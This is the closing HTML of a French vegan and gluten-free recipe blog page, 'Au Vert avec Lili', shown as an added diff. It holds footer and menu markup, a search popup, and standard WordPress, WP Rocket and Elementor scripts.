+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-a19254f elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="a19254f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-73f1241 elementor-hidden-phone" data-id="73f1241" data-element_type="column">
+			<div class="elementor-column-wrap">
+							<div class="elementor-widget-wrap">
+								</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-80f48bb" data-id="80f48bb" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-7735342 elementor-view-default elementor-widget elementor-widget-icon" data-id="7735342" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" viewbox="0 0 469.333 469.333" style="enable-background:new 0 0 469.333 469.333;" xml:space="preserve">
+<g>
+	<g>
+		<g>
+			<path d="M128,224c0-5.896-4.771-10.667-10.667-10.667c-5.896,0-10.667,4.771-10.667,10.667c0,28.01,30.896,66.469,34.417,70.771     c2.115,2.563,5.177,3.896,8.26,3.896c2.375,0,4.771-0.792,6.76-2.417c4.552-3.74,5.208-10.458,1.479-15.021     C146.146,267.292,128,239.437,128,224z"/>
+			<path d="M352,213.333c-5.896,0-10.667,4.771-10.667,10.667c0,15.385-18.146,43.271-29.583,57.24     c-3.729,4.552-3.063,11.271,1.49,15.01c1.979,1.625,4.375,2.417,6.76,2.417c3.083,0,6.135-1.333,8.25-3.896     c3.521-4.302,34.417-42.76,34.417-70.771C362.667,218.104,357.896,213.333,352,213.333z"/>
+			<path d="M234.667,213.333c-5.896,0-10.667,4.771-10.667,10.667v64c0,5.896,4.771,10.667,10.667,10.667     s10.667-4.771,10.667-10.667v-64C245.333,218.104,240.562,213.333,234.667,213.333z"/>
+			<path d="M352,42.667c-6.464,0-13.219,0.855-20.234,2.158C308.273,17.439,273.496,0,234.667,0s-73.607,17.439-97.099,44.824     c-7.016-1.302-13.771-2.158-20.234-2.158C52.635,42.667,0,95.302,0,160c0,44.333,25,84.635,64.25,104.562L64.042,425.76     c-0.01,11.635,4.51,22.573,12.729,30.802c8.229,8.24,19.156,12.771,30.792,12.771h254.25c24,0,43.521-19.521,43.521-43.521     V264.406c39.104-19.979,64-60.219,64-104.406C469.333,95.302,416.698,42.667,352,42.667z M384,425.813     c0,12.229-9.958,22.188-22.188,22.188h-254.25c-5.927,0-11.5-2.313-15.698-6.51c-4.188-4.198-6.5-9.771-6.49-15.708L85.43,384     H384V425.813z M390.604,247.802c-0.563,0.229-1.094,0.5-1.594,0.823c-1.344,0.833-2.448,1.938-3.271,3.208     c-0.833,1.26-1.396,2.719-1.625,4.281c-0.094,0.594-0.125,1.188-0.115,1.792v104.76H85.457l0.137-104.615     c0.01-0.583-0.021-1.177-0.104-1.75c-0.229-1.615-0.823-3.115-1.688-4.417c-0.813-1.219-1.875-2.281-3.167-3.094     c-0.531-0.333-1.094-0.625-1.677-0.865C43.948,232.615,21.333,198.135,21.333,160c0-52.938,43.063-96,96-96     c2.069,0,4.253,0.25,6.396,0.419c-10.792,18.756-17.063,40.43-17.063,63.581c0,5.896,4.771,10.667,10.667,10.667     c5.896,0,10.667-4.771,10.667-10.667c0-58.813,47.854-106.667,106.667-106.667S341.333,69.187,341.333,128     c0,5.896,4.771,10.667,10.667,10.667c5.896,0,10.667-4.771,10.667-10.667c0-23.151-6.271-44.824-17.063-63.581     C347.747,64.25,349.931,64,352,64c52.938,0,96,43.063,96,96C448,198,425.479,232.437,390.604,247.802z"/>
+		</g>
+	</g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>			</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-d668b24 elementor-widget elementor-widget-theme-site-title elementor-widget-heading" data-id="d668b24" data-element_type="widget" data-widget_type="theme-site-title.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr">Au Vert avec Lili</a></h2>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-7140b8b elementor-hidden-phone" data-id="7140b8b" data-element_type="column">
+			<div class="elementor-column-wrap">
+							<div class="elementor-widget-wrap">
+								</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-60509e4 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="60509e4" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-db2e55d" data-id="db2e55d" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-a332b2d elementor-widget elementor-widget-heading" data-id="a332b2d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/mes-livres">Mes livres</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-dbc79a8" data-id="dbc79a8" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-741c536 elementor-widget elementor-widget-heading" data-id="741c536" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/?s=vegan+et+sans+gluten">Toutes les recettes</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-e5d7b13" data-id="e5d7b13" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-81d4f2c elementor-widget elementor-widget-heading" data-id="81d4f2c" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/coaching/">Coaching</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-f5e61c0" data-id="f5e61c0" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-89a6b49 elementor-widget elementor-widget-heading" data-id="89a6b49" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/cours-de-cuisine-en-ligne/">Cours de cuisine</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-570a084" data-id="570a084" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-b276e6c elementor-widget elementor-widget-heading" data-id="b276e6c" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/propos/">A propos</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-5e4088e elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5e4088e" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-d06d431" data-id="d06d431" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-10b3b13 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="10b3b13" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-39188f2 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="39188f2" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-7287165" data-id="7287165" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-6358905 elementor-widget elementor-widget-heading" data-id="6358905" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default">©AUVERTAVECLILI.FR</div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-9c3d97a" data-id="9c3d97a" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-50b3ef2 elementor-widget elementor-widget-heading" data-id="50b3ef2" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/mentions-legales">MENTIONS LÉGALES</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-a883f1c" data-id="a883f1c" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d81a76f elementor-widget elementor-widget-heading" data-id="d81a76f" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/conditions-generales-de-vente">CONDITIONS DE VENTE</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-947484f" data-id="947484f" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-a7f8f2e elementor-widget elementor-widget-heading" data-id="a7f8f2e" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/politique-de-confidentialite">CONFIDENTIALITÉ</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				</div>
+		</div>
+		
+		<div data-elementor-type="popup" data-elementor-id="19872" class="elementor elementor-19872 elementor-location-popup" data-elementor-settings="{&quot;open_selector&quot;:&quot;#my-popup&quot;,&quot;timing&quot;:[]}">
+		<div class="elementor-section-wrap">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-33786b0f elementor-section-height-full elementor-section-items-stretch elementor-section-boxed elementor-section-height-default" data-id="33786b0f" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-5f2bef0c" data-id="5f2bef0c" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-7f81473 elementor-widget elementor-widget-theme-site-logo elementor-widget-image" data-id="7f81473" data-element_type="widget" data-widget_type="theme-site-logo.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+											<a href="https://auvertaveclili.fr">
+							<picture class="attachment-medium size-medium" loading="lazy">
+<source type="image/webp" srcset="images/cropped-Logo-px-removebg-preview-500x456.png.webp">
+<img width="500" height="456" src="images/cropped-Logo-px-removebg-preview-500x456.png" alt="" loading="lazy">
+</picture>
+								</a>
+											</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-3123907c elementor-nav-menu--dropdown-none elementor-nav-menu__align-center elementor-nav-menu--indicator-classic elementor-widget elementor-widget-nav-menu" data-id="3123907c" data-element_type="widget" data-settings="{&quot;layout&quot;:&quot;vertical&quot;}" data-widget_type="nav-menu.default">
+				<div class="elementor-widget-container">
+						<nav role="navigation" class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-none"><ul id="menu-1-3123907c" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19878"><a href="https://auvertaveclili.fr/index-des-recettes" class="elementor-item">Toutes les recettes</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19880"><a href="https://auvertaveclili.fr/?s=sans+gluten" class="elementor-item">Sans gluten</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19881"><a href="https://auvertaveclili.fr/mes-livres/" class="elementor-item">Mes livres</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19882"><a href="https://auvertaveclili.fr/cours-de-cuisine-en-ligne/" class="elementor-item">Cours de cuisine</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22190"><a href="https://auvertaveclili.fr/podcast/" class="elementor-item">Podcast</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19883"><a href="https://vertmavie.com/" class="elementor-item">Coaching</a></li>
+</ul></nav>
+					<div class="elementor-menu-toggle" role="button" tabindex="0" aria-label="Permuter le menu" aria-expanded="false">
+			<i class="eicon-menu-bar" aria-hidden="true"></i>
+			<span class="elementor-screen-only">Menu</span>
+		</div>
+			<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" role="navigation" aria-hidden="true"><ul id="menu-2-3123907c" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19878"><a href="https://auvertaveclili.fr/index-des-recettes" class="elementor-item">Toutes les recettes</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19880"><a href="https://auvertaveclili.fr/?s=sans+gluten" class="elementor-item">Sans gluten</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19881"><a href="https://auvertaveclili.fr/mes-livres/" class="elementor-item">Mes livres</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19882"><a href="https://auvertaveclili.fr/cours-de-cuisine-en-ligne/" class="elementor-item">Cours de cuisine</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22190"><a href="https://auvertaveclili.fr/podcast/" class="elementor-item">Podcast</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19883"><a href="https://vertmavie.com/" class="elementor-item">Coaching</a></li>
+</ul></nav>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-2d24c8dc elementor-search-form--skin-minimal elementor-widget elementor-widget-search-form" data-id="2d24c8dc" data-element_type="widget" data-settings="{&quot;skin&quot;:&quot;minimal&quot;}" data-widget_type="search-form.default">
+				<div class="elementor-widget-container">
+					<form class="elementor-search-form" role="search" action="https://auvertaveclili.fr" method="get">
+									<div class="elementor-search-form__container">
+									<div class="elementor-search-form__icon">
+						<i class="fa fa-search" aria-hidden="true"></i>
+						<span class="elementor-screen-only">Rechercher </span>
+					</div>
+								<input placeholder="Rechercher..." class="elementor-search-form__input" type="search" name="s" title="Rechercher " value="">
+															</div>
+		</form>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				</div>
+		</div>
+		<div id="fb-pxl-ajax-code"></div><link rel="stylesheet" id="yarppRelatedCss-css" href="css/related.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-post-19872-css" href="css/post-19872.css" type="text/css" media="all">
+<script type="text/javascript" id="thickbox-js-extra">
+/* <![CDATA[ */
+var thickboxL10n = {"next":"Suiv.\u00a0>","prev":"<\u00a0Pr\u00e9c.","image":"Image","of":"sur","close":"Fermer","noiframes":"Cette fonctionnalit\u00e9 requiert des iframes. Les iframes sont d\u00e9sactiv\u00e9es sur votre navigateur, ou alors il ne les accepte pas.","loadingAnimation":"https:\/\/auvertaveclili.fr\/wp-includes\/js\/thickbox\/loadingAnimation.gif"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="js/thickbox.js" id="thickbox-js"></script>
+<script type="text/javascript" src="js/core.min.js" id="jquery-ui-core-js"></script>
+<script type="text/javascript" src="js/datepicker.min.js" id="jquery-ui-datepicker-js"></script>
+<script type="text/javascript" id="jquery-ui-datepicker-js-after">
+jQuery(document).ready(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Fermer","currentText":"Aujourd\u2019hui","monthNames":["janvier","f\u00e9vrier","mars","avril","mai","juin","juillet","ao\u00fbt","septembre","octobre","novembre","d\u00e9cembre"],"monthNamesShort":["Jan","F\u00e9v","Mar","Avr","Mai","Juin","Juil","Ao\u00fbt","Sep","Oct","Nov","D\u00e9c"],"nextText":"Suivant","prevText":"Pr\u00e9c\u00e9dent","dayNames":["dimanche","lundi","mardi","mercredi","jeudi","vendredi","samedi"],"dayNamesShort":["dim","lun","mar","mer","jeu","ven","sam"],"dayNamesMin":["D","L","M","M","J","V","S"],"dateFormat":"dd\/mm\/yy","firstDay":1,"isRTL":false});});
+</script>
+<script type="text/javascript" id="rocket-browser-checker-js-after">
+"use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();
+</script>
+<script type="text/javascript" id="rocket-delay-js-js-after">
+(function() {
+"use strict";var e=function(){function n(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}();function n(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function r(e,t){n(this,r),this.attrName="data-rocketlazyloadscript",this.browser=t,this.options=this.browser.options,this.triggerEvents=e,this.userEventListener=this.triggerListener.bind(this)}return e(r,[{key:"init",value:function(){this._addEventListener(this)}},{key:"reset",value:function(){this._removeEventListener(this)}},{key:"_addEventListener",value:function(t){this.triggerEvents.forEach(function(e){return window.addEventListener(e,t.userEventListener,t.options)})}},{key:"_removeEventListener",value:function(t){this.triggerEvents.forEach(function(e){return window.removeEventListener(e,t.userEventListener,t.options)})}},{key:"_loadScriptSrc",value:function(){var r=this,e=document.querySelectorAll("script["+this.attrName+"]");0!==e.length&&Array.prototype.slice.call(e).forEach(function(e){var t=e.getAttribute(r.attrName);e.setAttribute("src",t),e.removeAttribute(r.attrName)}),this.reset()}},{key:"triggerListener",value:function(){this._loadScriptSrc(),this._removeEventListener(this)}}],[{key:"run",value:function(){RocketBrowserCompatibilityChecker&&new r(["keydown","mouseover","touchmove","touchstart"],new RocketBrowserCompatibilityChecker({passive:!0})).init()}}]),r}();t.run();
+}());
+</script>
+<script type="text/javascript" id="rocket-preload-links-js-extra">
+/* <![CDATA[ */
+var RocketPreloadLinksConfig = {"excludeUris":"\/(.+\/)?feed\/?.+\/?|\/(?:.+\/)?embed\/|\/(index\\.php\/)?wp\\-json(\/.*|$)|\/wp-admin\/|\/logout\/|\/wp-login.php","usesTrailingSlash":"1","imageExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif","fileExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|php|pdf|html|htm","siteUrl":"https:\/\/auvertaveclili.fr","onHoverDelay":"100","rateThrottle":"3"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="rocket-preload-links-js-after">
+(function() {
+"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("/")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("/")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof RocketPreloadLinksConfig&&new n(new RocketBrowserCompatibilityChecker({capture:!0,passive:!0}),RocketPreloadLinksConfig).init()}}]),n}();t.run();
+}());
+</script>
+<script type="text/javascript" src="js/wp-embed.min.js" id="wp-embed-js"></script>
+<script type="text/javascript" src="js/comment-reply.min.js" id="comment-reply-js"></script>
+<script async="async" type="text/javascript" src="js/form.js" id="akismet-form-js"></script>
+<script type="text/javascript" src="js/jquery.smartmenus.min.js" id="smartmenus-js"></script>
+<script type="text/javascript" src="js/frontend-modules.min.js" id="elementor-frontend-modules-js"></script>
+<script type="text/javascript" src="js/jquery.sticky.min.js" id="elementor-sticky-js"></script>
+<script type="text/javascript" id="elementor-pro-frontend-js-before">
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/auvertaveclili.fr\/wp-admin\/admin-ajax.php","nonce":"bc63fa3609","i18n":{"toc_no_headings_found":"Aucun titre n\u2019a \u00e9t\u00e9 trouv\u00e9 sur cette page."},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"google":{"title":"Google+","has_counter":true},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"delicious":{"title":"Delicious"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"weixin":{"title":"WeChat"},"weibo":{"title":"Weibo"}},"facebook_sdk":{"lang":"fr_FR","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/auvertaveclili.fr\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
+</script>
+<script type="text/javascript" src="js/frontend.min_1.js" id="elementor-pro-frontend-js"></script>
+<script type="text/javascript" src="js/position.min.js" id="jquery-ui-position-js"></script>
+<script type="text/javascript" src="js/dialog.min.js" id="elementor-dialog-js"></script>
+<script type="text/javascript" src="js/waypoints.min.js" id="elementor-waypoints-js"></script>
+<script type="text/javascript" src="js/swiper.min.js" id="swiper-js"></script>
+<script type="text/javascript" src="js/share-link.min.js" id="share-link-js"></script>
+<script type="text/javascript" id="elementor-frontend-js-before">
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false},"i18n":{"shareOnFacebook":"Partager sur Facebook","shareOnTwitter":"Partager sur Twitter","pinIt":"L\u2019\u00e9pingler","download":"T\u00e9l\u00e9charger","downloadImage":"T\u00e9l\u00e9charger une image","fullscreen":"Plein \u00e9cran","zoom":"Zoom","share":"Partager","playVideo":"Lire la vid\u00e9o","previous":"Pr\u00e9c\u00e9dent","next":"Suivant","close":"Fermer"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"version":"3.0.10","is_static":false,"legacyMode":{"elementWrappers":true},"urls":{"assets":"https:\/\/auvertaveclili.fr\/wp-content\/plugins\/elementor\/assets\/"},"settings":{"page":[],"editorPreferences":[]},"kit":{"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":19603,"title":"Sirop%20de%20fraises%20maison%20~%20et%20une%20recette%20bonus%20de%20muffins%20%28vegan%2C%20sans%20gluten%29%20-%20Au%20Vert%20avec%20Lili","excerpt":"","featuredImage":"https:\/\/auvertaveclili.fr\/wp-content\/uploads\/2020\/04\/IMG_2439.jpg"}};
+</script>
+<script type="text/javascript" src="js/frontend.min_2.js" id="elementor-frontend-js"></script>
+
+</body>
+</html>
+
+<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me - Debug: cached@1616828383 -->
